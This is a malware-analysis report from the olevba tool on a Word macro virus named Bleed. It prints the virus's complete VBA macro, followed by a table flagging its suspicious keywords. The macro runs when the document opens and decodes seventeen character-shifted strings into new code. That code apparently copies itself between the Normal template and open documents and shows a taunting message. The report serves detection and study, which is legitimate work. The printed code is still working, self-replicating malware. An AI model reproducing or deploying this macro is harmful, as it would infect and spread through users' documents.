olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bleed-1ed3c57e7646bc2920b008829c614647235b009b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bleed-1ed3c57e7646bc2920b008829c614647235b009b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
Dim jacky(17) As String
jacky(1) = "l‹=b��Œ�=o‚�’Š‚=k‚•‘W=p‚‘=Š~€Œ=Z=j~€�Œ`Œ‹‘~†‹‚�"
jacky(2) = "l�‘†Œ‹�Kp~“‚kŒ�Š~‰m�ŒŠ�‘=Z=Eo‹�=G=MFW=p‚‘^‘‘�=kŒ�Š~‰q‚Š�‰~‘‚Kc’‰‰k~Š‚I=“kŒ�Š~‰"
jacky(3) = "p‚‘=“�=Z=Š~€ŒKs_m�Œ‡‚€‘W=l�‘†Œ‹�Ks†�’�m�Œ‘‚€‘†Œ‹=Z=Eo‹�=G=MF"
jacky(4) = "p‚‘=“€=Z=“�Ks_`ŒŠ�Œ‹‚‹‘�ENFW=p‚‘=€ŒŠŒ=Z=“€K`Œ�‚jŒ�’‰‚"
jacky(5) = "p‚‘=…Œ�‘=Z=kŒ�Š~‰q‚Š�‰~‘‚W=“€Œ�‚=Z=€ŒŠŒK‰†‹‚�ENI=OUF=C=“`�=C=?b‹�=p’?"
jacky(6) = "fƒ=Š~€Œ=Z=…Œ�‘=q…‚‹=p‚‘=…Œ�‘=Z=^€‘†“‚aŒ€’Š‚‹‘"
jacky(7) = "p‚‘=‹‚”…Œ�‘=Z=…Œ�‘Ks_m�Œ‡‚€‘Ks_`ŒŠ�Œ‹‚‹‘�ENFK`Œ�‚jŒ�’‰‚"
jacky(8) = "fƒ=‹‚”…Œ�‘K‰†‹‚�ENI=NF=Y[=?m�†“~‘‚=p’=aŒ€’Š‚‹‘|l�‚‹EF?=q…‚‹"
jacky(9) = "‹‚”…Œ�‘Ka‚‰‚‘‚i†‹‚�=NI=‹‚”…Œ�‘K€Œ’‹‘Œƒ‰†‹‚�"
jacky(10) = "‹‚”…Œ�‘K~��ƒ�ŒŠ�‘�†‹„=“€Œ�‚"
jacky(11) = "…Œ�‘Kp~“‚"
jacky(12) = "b‹�=fƒ"
jacky(13) = "fƒ=a~–EkŒ”EFF=Z=Ef‹‘Eo‹�=G=NRF=H=NF=q…‚‹"
jacky(14) = "j�„_Œ•=?f=Š~ˆ‚=?=C=^��‰†€~‘†Œ‹Kr�‚�k~Š‚=C=?=‰‚‚�>?I=MI=?`‰~��K‰‚‚�=™=‡~€ˆ=‘”Œƒ‰Œ”‚�=L=i†‹‚w‚�M=L=j‚‘~�…~�‚?"
jacky(15) = "b‹�=fƒ"
jacky(16) = "q…†�aŒ€’Š‚‹‘Ks_m�Œ‡‚€‘Ks_`ŒŠ�Œ‹‚‹‘�ENFK`Œ�‚jŒ�’‰‚Ka‚‰‚‘‚i†‹‚�=OVI=NU"
jacky(17) = "fƒ=^€‘†“‚aŒ€’Š‚‹‘Kp~“‚�=Z=c~‰�‚=q…‚‹=^€‘†“‚aŒ€’Š‚‹‘Kp~“‚"
For i = 1 To 17: vc = vc & encrypt(jacky(i)): Next i
ThisDocument.VBProject.VBComponents(1).CodeModule.InsertLines 29, vc
bleed
End Sub
Private Function encrypt(c As String)
For x = 1 To Len(c): A = Asc(Mid(c, x, 1)): Ch = A - 29: NC = NC & Chr(Ch): Next
encrypt = NC & vbCr
End Function
Private Sub bleed()
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

